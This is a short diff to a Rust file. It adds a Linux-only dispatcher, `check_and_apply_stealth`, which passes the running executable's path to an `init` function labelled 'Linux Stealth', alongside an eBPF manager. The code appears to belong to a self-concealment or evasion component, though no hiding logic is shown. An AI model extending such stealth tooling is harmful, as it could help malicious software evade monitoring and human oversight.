@@ -18,6 +18,17 @@ pub use ebpf::EbpfManager;
 
 use log::info;
 
+/// Check and apply stealth - platform dispatcher calls this
+#[cfg(target_os = "linux")]
+pub fn check_and_apply_stealth() {
+    // Get current executable path for self-hardening
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(path) = exe.to_str() {
+            init(path);
+        }
+    }
+}
+
 /// Main entry point for Linux Stealth
 #[cfg(target_os = "linux")]
 pub fn init(argv0: &str) {
